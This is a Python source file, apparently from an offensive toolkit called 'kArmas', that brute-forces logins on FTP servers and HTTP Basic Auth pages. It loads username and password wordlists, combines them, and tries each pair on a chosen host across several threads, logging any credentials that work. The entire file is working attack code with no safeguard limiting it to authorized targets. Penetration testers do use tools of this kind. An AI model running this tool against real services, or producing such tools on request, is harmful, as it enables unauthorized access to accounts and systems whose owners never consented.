#!/usr/bin/env python3
"""
kArmas BruteForce Module
------------------------
Brute-force authentication for FTP and HTTP services
- Built-in wordlist support
- Rate limiting and throttling
- Multi-threading support
- Progress tracking
- Logging

Author: kArmasec
"""

import os
import sys
import time
import logging
from ftplib import FTP, error_perm, all_errors
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
import requests
from requests.auth import HTTPBasicAuth
from tqdm import tqdm

# Rate limiting settings
DEFAULT_DELAY = 0.5  # seconds between attempts
DEFAULT_THREADS = 3
MAX_THREADS = 10

# Setup logger
log = logging.getLogger("kArmas_bruteforce")


class WordlistManager:
    """Manages loading and accessing built-in and custom wordlists."""
    
    def __init__(self):
        # Get the script directory
        self.script_dir = os.path.dirname(os.path.abspath(__file__))
        self.wordlist_dir = os.path.join(self.script_dir, "wordlists")
        
        # Built-in wordlist names (without .txt extension)
        self.builtin_wordlists = {
            "common-usernames": "common-usernames.txt",
            "common-passwords": "common-passwords.txt",
            "ftp-credentials": "ftp-credentials.txt",
            "http-credentials": "http-credentials.txt",
        }
    
    def get_wordlist_path(self, wordlist_name):
        """Get the full path for a built-in wordlist."""
        if wordlist_name in self.builtin_wordlists:
            return os.path.join(self.wordlist_dir, self.builtin_wordlists[wordlist_name])
        return None
    
    def load_wordlist(self, wordlist_identifier):
        """
        Load wordlist from built-in name or custom path.
        Returns list of entries (stripped of whitespace).
        Skips empty lines and comments.
        """
        # Check if it's a built-in wordlist
        wordlist_path = self.get_wordlist_path(wordlist_identifier)
        
        # If not built-in, treat as custom path
        if wordlist_path is None:
            wordlist_path = wordlist_identifier
        
        if not os.path.exists(wordlist_path):
            raise FileNotFoundError(f"Wordlist not found: {wordlist_path}")
        
        entries = []
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                # Skip empty lines and comments
                if line and not line.startswith('#'):
                    entries.append(line)
        
        return entries
    
    def load_credentials(self, wordlist_identifier):
        """
        Load credentials from wordlist in username:password format.
        Returns list of tuples: [(username, password), ...]
        """
        entries = self.load_wordlist(wordlist_identifier)
        credentials = []
        
        for entry in entries:
            if ':' in entry:
                parts = entry.split(':', 1)
                username = parts[0]
                password = parts[1] if len(parts) > 1 else ''
                credentials.append((username, password))
        
        return credentials
    
    def generate_credential_pairs(self, usernames, passwords):
        """
        Generate all combinations of usernames and passwords.
        Returns list of tuples: [(username, password), ...]
        """
        credentials = []
        for username in usernames:
            for password in passwords:
                credentials.append((username, password))
        return credentials


class FTPBruteForce:
    """FTP brute-force attack manager."""
    
    def __init__(self, host, port=21, timeout=10, delay=DEFAULT_DELAY, 
                 threads=DEFAULT_THREADS, verbose=False):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.delay = delay
        self.threads = min(threads, MAX_THREADS)
        self.verbose = verbose
        self.lock = Lock()
        self.success = None
        self.stopped = False
    
    def test_credential(self, username, password):
        """Test a single FTP credential."""
        if self.stopped:
            return None
        
        try:
            # Add delay for rate limiting
            time.sleep(self.delay)
            
            ftp = FTP(timeout=self.timeout)
            ftp.connect(self.host, self.port)
            ftp.login(username, password)
            ftp.quit()
            
            # Success!
            with self.lock:
                if not self.stopped:
                    self.success = (username, password)
                    self.stopped = True
                    log.info(f"✓ SUCCESS: {username}:{password}")
                    return (username, password)
            
        except error_perm:
            # Login failed (expected)
            if self.verbose:
                log.debug(f"✗ Failed: {username}:{password}")
        except all_errors as e:
            # Connection or other error
            if self.verbose:
                log.debug(f"✗ Error for {username}:{password} - {e}")
        
        return None
    
    def bruteforce(self, credentials):
        """
        Perform brute-force attack with given credentials.
        credentials: list of (username, password) tuples
        Returns: (username, password) if successful, None otherwise
        """
        log.info(f"Starting FTP brute-force attack on {self.host}:{self.port}")
        log.info(f"Testing {len(credentials)} credential combinations")
        log.info(f"Using {self.threads} threads with {self.delay}s delay")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            # Create progress bar
            with tqdm(total=len(credentials), desc="Testing", unit="creds") as pbar:
                futures = []
                
                # Submit all tasks
                for username, password in credentials:
                    if self.stopped:
                        break
                    future = executor.submit(self.test_credential, username, password)
                    futures.append(future)
                
                # Process results
                for future in as_completed(futures):
                    pbar.update(1)
                    result = future.result()
                    if result:
                        # Success found, cancel remaining
                        pbar.close()
                        log.info(f"✓ Valid credentials found: {result[0]}:{result[1]}")
                        return result
        
        if not self.success:
            log.info("✗ No valid credentials found")
        
        return self.success


class HTTPBruteForce:
    """HTTP Basic Authentication brute-force attack manager."""
    
    def __init__(self, url, timeout=10, delay=DEFAULT_DELAY,
                 threads=DEFAULT_THREADS, verbose=False):
        self.url = url
        self.timeout = timeout
        self.delay = delay
        self.threads = min(threads, MAX_THREADS)
        self.verbose = verbose
        self.lock = Lock()
        self.success = None
        self.stopped = False
    
    def test_credential(self, username, password):
        """Test a single HTTP credential."""
        if self.stopped:
            return None
        
        try:
            # Add delay for rate limiting
            time.sleep(self.delay)
            
            response = requests.get(
                self.url,
                auth=HTTPBasicAuth(username, password),
                timeout=self.timeout,
                allow_redirects=False
            )
            
            # Check if authentication succeeded
            if response.status_code == 200:
                # Success!
                with self.lock:
                    if not self.stopped:
                        self.success = (username, password)
                        self.stopped = True
                        log.info(f"✓ SUCCESS: {username}:{password}")
                        return (username, password)
            
            elif response.status_code == 401:
                # Authentication failed (expected)
                if self.verbose:
                    log.debug(f"✗ Failed: {username}:{password}")
            else:
                # Other status code
                if self.verbose:
                    log.debug(f"✗ Status {response.status_code} for {username}:{password}")
                    
        except requests.exceptions.RequestException as e:
            # Connection or other error
            if self.verbose:
                log.debug(f"✗ Error for {username}:{password} - {e}")
        
        return None
    
    def bruteforce(self, credentials):
        """
        Perform brute-force attack with given credentials.
        credentials: list of (username, password) tuples
        Returns: (username, password) if successful, None otherwise
        """
        log.info(f"Starting HTTP brute-force attack on {self.url}")
        log.info(f"Testing {len(credentials)} credential combinations")
        log.info(f"Using {self.threads} threads with {self.delay}s delay")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            # Create progress bar
            with tqdm(total=len(credentials), desc="Testing", unit="creds") as pbar:
                futures = []
                
                # Submit all tasks
                for username, password in credentials:
                    if self.stopped:
                        break
                    future = executor.submit(self.test_credential, username, password)
                    futures.append(future)
                
                # Process results
                for future in as_completed(futures):
                    pbar.update(1)
                    result = future.result()
                    if result:
                        # Success found, cancel remaining
                        pbar.close()
                        log.info(f"✓ Valid credentials found: {result[0]}:{result[1]}")
                        return result
        
        if not self.success:
            log.info("✗ No valid credentials found")
        
        return self.success


def run_ftp_bruteforce(host, wordlist=None, username_list=None, 
                       password_list=None, custom_wordlist=None,
                       port=21, timeout=10, delay=DEFAULT_DELAY,
                       threads=DEFAULT_THREADS, verbose=False):
    """
    Run FTP brute-force attack with specified wordlists.
    
    Args:
        host: Target FTP host
        wordlist: Built-in credential wordlist name (e.g., 'ftp-credentials')
        username_list: Built-in username wordlist name (e.g., 'common-usernames')
        password_list: Built-in password wordlist name (e.g., 'common-passwords')
        custom_wordlist: Path to custom wordlist file
        port: FTP port (default: 21)
        timeout: Connection timeout in seconds
        delay: Delay between attempts in seconds
        threads: Number of concurrent threads
        verbose: Enable verbose logging
    
    Returns:
        Tuple of (username, password) if successful, None otherwise
    """
    wm = WordlistManager()
    credentials = []
    
    try:
        if custom_wordlist:
            # Use custom wordlist
            log.info(f"Loading custom wordlist: {custom_wordlist}")
            credentials = wm.load_credentials(custom_wordlist)
        elif wordlist:
            # Use built-in credential wordlist
            log.info(f"Loading built-in wordlist: {wordlist}")
            credentials = wm.load_credentials(wordlist)
        elif username_list and password_list:
            # Generate combinations from username and password lists
            log.info(f"Loading username list: {username_list}")
            usernames = wm.load_wordlist(username_list)
            log.info(f"Loading password list: {password_list}")
            passwords = wm.load_wordlist(password_list)
            credentials = wm.generate_credential_pairs(usernames, passwords)
        else:
            raise ValueError("Must specify wordlist, username_list+password_list, or custom_wordlist")
        
        if not credentials:
            raise ValueError("No credentials loaded from wordlist(s)")
        
        # Run brute-force attack
        brute = FTPBruteForce(host, port, timeout, delay, threads, verbose)
        result = brute.bruteforce(credentials)
        
        return result
        
    except Exception as e:
        log.error(f"Error during FTP brute-force: {e}")
        return None


def run_http_bruteforce(url, wordlist=None, username_list=None,
                        password_list=None, custom_wordlist=None,
                        timeout=10, delay=DEFAULT_DELAY,
                        threads=DEFAULT_THREADS, verbose=False):
    """
    Run HTTP Basic Auth brute-force attack with specified wordlists.
    
    Args:
        url: Target URL with Basic Auth
        wordlist: Built-in credential wordlist name (e.g., 'http-credentials')
        username_list: Built-in username wordlist name (e.g., 'common-usernames')
        password_list: Built-in password wordlist name (e.g., 'common-passwords')
        custom_wordlist: Path to custom wordlist file
        timeout: Connection timeout in seconds
        delay: Delay between attempts in seconds
        threads: Number of concurrent threads
        verbose: Enable verbose logging
    
    Returns:
        Tuple of (username, password) if successful, None otherwise
    """
    wm = WordlistManager()
    credentials = []
    
    try:
        if custom_wordlist:
            # Use custom wordlist
            log.info(f"Loading custom wordlist: {custom_wordlist}")
            credentials = wm.load_credentials(custom_wordlist)
        elif wordlist:
            # Use built-in credential wordlist
            log.info(f"Loading built-in wordlist: {wordlist}")
            credentials = wm.load_credentials(wordlist)
        elif username_list and password_list:
            # Generate combinations from username and password lists
            log.info(f"Loading username list: {username_list}")
            usernames = wm.load_wordlist(username_list)
            log.info(f"Loading password list: {password_list}")
            passwords = wm.load_wordlist(password_list)
            credentials = wm.generate_credential_pairs(usernames, passwords)
        else:
            raise ValueError("Must specify wordlist, username_list+password_list, or custom_wordlist")
        
        if not credentials:
            raise ValueError("No credentials loaded from wordlist(s)")
        
        # Run brute-force attack
        brute = HTTPBruteForce(url, timeout, delay, threads, verbose)
        result = brute.bruteforce(credentials)
        
        return result
        
    except Exception as e:
        log.error(f"Error during HTTP brute-force: {e}")
        return None
